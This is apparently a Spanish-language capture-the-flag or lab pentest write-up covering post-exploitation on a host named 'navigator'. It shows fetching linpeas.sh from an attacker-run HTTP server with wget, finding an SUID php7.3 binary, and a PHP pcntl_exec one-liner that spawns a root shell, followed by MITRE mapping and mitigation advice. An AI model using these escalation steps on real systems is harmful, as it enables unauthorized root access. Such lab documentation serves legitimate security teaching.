# Fase 4: Post-Explotación y Escalada de Privilegios (SUID Privilege Escalation)

## 🎯 Objetivos de la Fase
El objetivo final de esta fase fue realizar una auditoría interna del sistema desde la cuenta de usuario de bajos privilegios (`denisse`), identificar vectores de escalada de privilegios para obtener acceso administrativo de superusuario (`root`), evadir los controles de seguridad locales y extraer la bandera del objetivo final.

---

## 4.1 Auditoría Interna del Sistema y Transferencia de Herramientas (`linpeas.sh`)
Para automatizar el descubrimiento de vulnerabilidades internas e inspeccionar malas configuraciones del sistema, se transfirió el script de auditoría `linpeas.sh` hacia la máquina objetivo utilizando un servidor HTTP de Python alojado por el atacante.

* **En la Máquina Atacante (Kali Linux - 192.168.120.142):**
```bash
# Iniciar un servidor web temporal para alojar herramientas
python3 -m http.server 8000
```

* **En la Máquina Objetivo (Sesión SSH como denisse):**
```bash
# Descargar el script de auditoría y asignarle permisos de ejecución
wget http://192.168.120.142:8000/linpeas.sh
chmod +x linpeas.sh
```

> [!NOTE]
> **Nota Operacional:** Se recomienda replicar esta auditoría automatizada bajo otras cuentas del sistema (como `www-data`) para descartar rutas alternativas de escalada de privilegios internos.

---

## 4.2 Enumeración de Binarios SUID (`/usr/bin/php7.3`)
Se ejecutó una búsqueda manual para identificar binarios ejecutables que tuvieran activo el bit de permiso SUID (Set User ID), el cual permite a los usuarios sin privilegios ejecutar programas con los privilegios del propietario del archivo (`root`).

```bash
# Filtrar archivos ejecutables SUID suprimiendo los errores de permiso
find / -perm -4000 2>/dev/null
```

### 🔍 Análisis del Hallazgo Crítico:
La auditoría reveló un fallo de configuración extraordinario en el binario del intérprete nativo de PHP:

```bash
# Verificar los permisos específicos del binario PHP identificado
ls -l /usr/bin/php7.3
```

```text
-rwsr-xr-x 1 root root 4634024 mar 11 2026 /usr/bin/php7.3
```

* **Severidad:** Alta / Crítica. El propietario del binario es `root` y tiene el bit SUID establecido (`-rwsr-xr-x`). Cualquier código o comando ejecutado a través de la ruta de este binario se procesará bajo los privilegios efectivos de `root`, violando el Principio de Menor Privilegio.

---

## 4.3 Escalada de Privilegios mediante GTFOBins (`php7.3`)
De acuerdo con la documentación de GTFOBins, cuando un binario de PHP mantiene permisos SUID, se puede invocar su función interna de ejecución de control de procesos (`pcntl_exec`) desde la línea de comandos. Esto permite generar una shell del sistema sin restricciones, preservando los derechos efectivos de `root` mediante el parámetro `-p`.

### Ejecución del Exploit:
```bash
# Invocar pcntl_exec a través de PHP para ejecutar /bin/sh manteniendo privilegios efectivos
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

---

## 🔍 Actualización de Shell y Captura de la Bandera de Root
La ejecución del payload de PHP generó de inmediato un contexto de shell privilegiado:

```bash
# Verificar la identidad del proceso
id
```

```text
uid=1001(denisse) gid=1001(denisse) euid=0(root) groups=1001(denisse)
```

```bash
# Actualizar a una shell interactiva Bash y navegar al directorio raíz del administrador
cd /root
bash -i
```

```text
root@navigator:~# 
```

* **Estado del Compromiso del Objetivo:** `euid=0(root)` confirmado. Se aseguró acceso total de lectura, escritura y ejecución administrativa sobre todo el host objetivo. La auditoría concluyó extrayendo la bandera final de root (`bandera2.txt`).

---

## 🛡️ Mapeo con MITRE ATT&CK
* **Táctica:** Privilege Escalation ([TA0004](https://mitre.org))
    * **Técnica:** Abuse Elevation Control Mechanism: Setuid and Setgid ([T1548.001](https://mitre.org)) - Abuso de permisos SUID asignados incorrectamente en `/usr/bin/php7.3` para romper los límites de la cuenta de usuario estándar.
* **Táctica:** Defense Evasion ([TA0005](https://mitre.org))
    * **Técnica:** Abuse Elevation Control Mechanism: Setuid and Setgid ([T1548.001](https://mitre.org)) - Aprovechamiento de binarios nativos del sistema (*Living-off-the-Land Binaries* o *LoLBins*) para ejecutar acciones de carga útil administrativa utilizando binarios firmados legítimos.

---

## 💡 Mitigación y Robustecimiento Defensivo
1. **Eliminar Bits SUID Innecesarios:** Remover de inmediato los permisos especiales SUID del intérprete PHP utilizando el comando `# chmod u-s /usr/bin/php7.3`. Bajo operaciones estándar, los intérpretes de scripts de propósito general nunca deben ejecutarse con privilegios globales de `root` por defecto.
2. **Robustecimiento de SUID/SGID y Auditoría Periódica:** Establecer tareas programadas (*cron*) o políticas de monitoreo continuo para verificar la integridad de los binarios y auditar la lista de ejecutables SUID autorizados en los entornos de producción. Esto permitirá emitir alertas sobre adiciones sospechosas o efectos secundarios provocados por actualizaciones de software.
